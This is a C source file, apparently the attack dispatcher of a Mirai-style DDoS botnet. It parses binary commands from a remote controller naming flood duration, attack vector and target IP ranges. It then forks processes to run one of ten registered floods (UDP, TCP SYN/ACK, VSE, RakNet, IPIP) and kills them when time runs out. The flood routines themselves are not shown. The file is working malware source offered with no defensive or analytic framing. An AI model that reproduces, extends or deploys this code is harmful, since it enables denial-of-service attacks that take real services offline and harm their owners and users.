#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>

#include "includes.h"
#include "attack.h"
#include "rand.h"
#include "util.h"

uint8_t methods_len = 10;

struct attack_method methods[] = 
{
    {0, &attack_udp_generic},
    {1, &attack_udp_plain},
    {2, &attack_tcp_syn},
    {3, &attack_tcp_ack},
    {4, &attack_udp_bypass},
    {5, &attack_udp_hex},
    {6, &attack_udp_pps},
    {7, &attack_vse},
    {8, &attack_raknet},
    {9, &attack_ipip},
};

void attack_parse(char *buf, int len) {
    int x;
    uint16_t duration;
    uint8_t vector, targs_len, opts_len;
    struct attack_target *targs = NULL;
    struct attack_option *opts = NULL;

    if (len < sizeof(uint16_t)) {
#ifdef DEBUG
        printf("[attack parser] Error: Insufficient length for duration.\n");
#endif
        goto cleanup;
    }
    duration = ntohs(*((uint16_t *)buf));
    buf += sizeof(uint16_t);
    len -= sizeof(uint16_t);

#ifdef DEBUG
    printf("[attack parser] Parsed duration: %d seconds\n", duration);
#endif

    if (len < sizeof(uint8_t)) {
#ifdef DEBUG
        printf("[attack parser] Error: Insufficient length for attack ID.\n");
#endif
        goto cleanup;
    }
    vector = *(uint8_t *)buf++;
    len -= sizeof(uint8_t);

#ifdef DEBUG
    printf("[attack parser] Parsed attack vector ID: %d\n", vector);
#endif

    if (len < sizeof(uint8_t)) {
#ifdef DEBUG
        printf("[attack parser] Error: Insufficient length for target count.\n");
#endif
        goto cleanup;
    }
    targs_len = *(uint8_t *)buf++;
    len -= sizeof(uint8_t);
    if (targs_len == 0) {
#ifdef DEBUG
        printf("[attack parser] Error: No targets specified.\n");
#endif
        goto cleanup;
    }

    if (len < ((sizeof(uint32_t) + sizeof(uint8_t)) * targs_len)) {
#ifdef DEBUG
        printf("[attack parser] Error: Insufficient length for target data.\n");
#endif
        goto cleanup;
    }
    targs = calloc(targs_len, sizeof(struct attack_target));
    for (x = 0; x < targs_len; x++) {
        targs[x].addr = *((uint32_t *)buf);
        buf += sizeof(uint32_t);
        targs[x].netmask = *(uint8_t *)buf++;
        len -= (sizeof(uint32_t) + sizeof(uint8_t));

        targs[x].sock_addr.sin_family = AF_INET;
        targs[x].sock_addr.sin_addr.s_addr = targs[x].addr;

#ifdef DEBUG
        printf("[attack parser] Parsed target %d -> %d.%d.%d.%d, Netmask: %d\n", x,
               targs[x].addr & 0xff, (targs[x].addr >> 8) & 0xff,
               (targs[x].addr >> 16) & 0xff, (targs[x].addr >> 24) & 0xff,
               targs[x].netmask);
#endif
    }

    if (len < sizeof(uint8_t)) {
#ifdef DEBUG
        printf("[attack parser] Error: Insufficient length for options count.\n");
#endif
        goto cleanup;
    }
    opts_len = *(uint8_t *)buf++;
    len -= sizeof(uint8_t);

#ifdef DEBUG
    printf("Parsed option count: %d\n", opts_len);
#endif

    if (opts_len > 0) {
        opts = calloc(opts_len, sizeof(struct attack_option));
        for (x = 0; x < opts_len; x++) {
            uint8_t val_len;

            if (len < sizeof(uint8_t)) {
#ifdef DEBUG
                printf("[attack parser] Error: Insufficient length for option key.\n");
#endif
                goto cleanup;
            }
            opts[x].key = *(uint8_t *)buf++;
            len -= sizeof(uint8_t);

            if (len < sizeof(uint8_t)) {
#ifdef DEBUG
                printf("[attack parser] Error: Insufficient length for option value length.\n");
#endif
                goto cleanup;
            }
            val_len = *(uint8_t *)buf++;
            len -= sizeof(uint8_t);

            if (len < val_len) {
#ifdef DEBUG
                printf("[attack parser] Error: Insufficient length for option value.\n");
#endif
                goto cleanup;
            }
            opts[x].val = calloc(val_len + 1, sizeof(char));
            memcpy(opts[x].val, buf, val_len);
            buf += val_len;
            len -= val_len;

#ifdef DEBUG
            printf("[attack parser] Parsed option %d -> Key: %d, Value: %s\n", x, opts[x].key, opts[x].val);
#endif
        }
    }

    errno = 0;
    attack_start(duration, vector, targs_len, targs, opts_len, opts);

cleanup:
    if (targs != NULL)
        free(targs);
    if (opts != NULL)
        free_opts(opts, opts_len);
}

void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int pid1, pid2;

    pid1 = fork();
    if (pid1 == -1 || pid1 > 0)
        return;
    
    pid2 = fork();
    if (pid2 == -1)
        exit(0);

    else if (pid2 == 0)
    {
        sleep(duration);
        kill(getppid(), 9);
        exit(0);
    }

    else
    {
        int i;

        for (i = 0; i < methods_len; i++) 
        {
            if (methods[i].vector == vector) 
            {
                methods[i].func(targs_len, targs, opts_len, opts);
                break;
            }
        }

        exit(0);
    }
}

char *attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, char *def)
{
    int i;

    for (i = 0; i < opts_len; i++)
    {
        if (opts[i].key == opt)
            return opts[i].val;
    }

    return def;
}

int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);

    if (val == NULL)
        return def;
    else
        return util_atoi(val, 10);
}

uint32_t attack_get_opt_ip(uint8_t opts_len, struct attack_option *opts, uint8_t opt, uint32_t def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);

    if (val == NULL)
        return def;
    else
        return inet_addr(val);
}

static void free_opts(struct attack_option *opts, int len)
{
    if (opts == NULL)
        return;

    for (int i = 0; i < len; i++)
        if (opts[i].val != NULL)
            free(opts[i].val);
    free(opts);
}
